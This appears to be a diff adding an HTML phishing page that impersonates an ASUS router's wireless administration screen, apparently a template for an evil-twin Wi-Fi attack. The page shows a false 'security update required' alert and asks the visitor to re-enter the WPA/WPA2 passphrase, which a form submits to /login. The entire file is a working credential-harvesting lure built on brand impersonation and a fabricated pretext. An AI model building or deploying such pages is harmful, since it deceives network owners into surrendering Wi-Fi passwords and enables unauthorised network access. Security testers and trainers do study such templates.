@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ASUS Wireless Router — Administration</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #1a1d23; color: #e8eaed; min-height: 100vh; }
+        .topbar { background: linear-gradient(180deg, #252830 0%, #1e2229 100%); border-bottom: 1px solid #2d3340; padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
+        .brand { font-size: 15px; font-weight: 600; letter-spacing: 0.04em; color: #5d9cec; }
+        .sub { font-size: 11px; color: #8b929e; }
+        .wrap { max-width: 720px; margin: 0 auto; padding: 16px; }
+        .panel { background: #252830; border: 1px solid #2d3340; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 24px rgba(0,0,0,0.35); }
+        .panel-head { background: #2a3140; padding: 12px 18px; font-size: 14px; font-weight: 600; color: #5d9cec; border-bottom: 1px solid #2d3340; }
+        .panel-body { padding: 20px 18px; }
+        .alert { background: rgba(93, 156, 236, 0.12); border: 1px solid #5d9cec; border-radius: 6px; padding: 12px 14px; margin-bottom: 20px; font-size: 13px; line-height: 1.5; color: #b8c9e6; }
+        .alert strong { color: #5d9cec; display: block; margin-bottom: 4px; }
+        .row { display: grid; grid-template-columns: 1fr; gap: 14px; }
+        @media (min-width: 520px) {
+            .row.two { grid-template-columns: 140px 1fr; align-items: center; }
+        }
+        label { font-size: 12px; color: #8b929e; font-weight: 600; text-transform: uppercase; letter-spacing: 0.03em; }
+        .value { font-size: 13px; color: #c5cad3; }
+        input[type="password"] { width: 100%; padding: 11px 12px; background: #1a1d23; border: 1px solid #3d4555; border-radius: 6px; color: #e8eaed; font-size: 14px; }
+        input[type="password"]:focus { outline: none; border-color: #5d9cec; box-shadow: 0 0 0 2px rgba(93, 156, 236, 0.25); }
+        .actions { margin-top: 22px; display: flex; justify-content: flex-end; gap: 10px; flex-wrap: wrap; }
+        .btn { padding: 10px 22px; background: #5d9cec; color: #0d1117; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; }
+        .btn:hover { background: #7ab0f0; }
+        .tabs { display: flex; gap: 0; border-bottom: 1px solid #2d3340; background: #1e2229; flex-wrap: wrap; }
+        .tabs span { padding: 10px 16px; font-size: 12px; color: #8b929e; }
+        .tabs span.on { color: #5d9cec; border-bottom: 2px solid #5d9cec; margin-bottom: -1px; }
+        .footer { text-align: center; padding: 20px; font-size: 11px; color: #5c6370; }
+    </style>
+</head>
+<body>
+    <div class="topbar">
+        <div><div class="brand">ASUS</div><div class="sub">Wireless Router</div></div>
+        <div class="sub">Administration</div>
+    </div>
+    <div class="wrap">
+        <div class="tabs">
+            <span>General</span><span class="on">Wireless</span><span>LAN</span><span>System</span>
+        </div>
+        <div class="panel" style="margin-top: 0; border-top-left-radius: 0; border-top-right-radius: 0;">
+            <div class="panel-head">Wireless — Security</div>
+            <div class="panel-body">
+                <div class="alert">
+                    <strong>Security update required</strong>
+                    A critical wireless security patch is pending. Re-enter your WPA/WPA2 passphrase so the router can verify and apply the update to your network.
+                </div>
+                <form method="POST" action="/login">
+                    <div class="row two">
+                        <label>Security</label>
+                        <div class="value">WPA2-Personal (AES)</div>
+                    </div>
+                    <div class="row two" style="margin-top: 16px;">
+                        <label for="pw">Wi-Fi password</label>
+                        <div>
+                            <input type="password" id="pw" name="wfphshr-wpa-password" placeholder="WPA/WPA2 passphrase" required autocomplete="current-password">
+                        </div>
+                    </div>
+                    <div class="actions">
+                        <button type="submit" class="btn">Apply</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="footer">Wireless administration — local device</div>
+    </div>
+</body>
+</html>
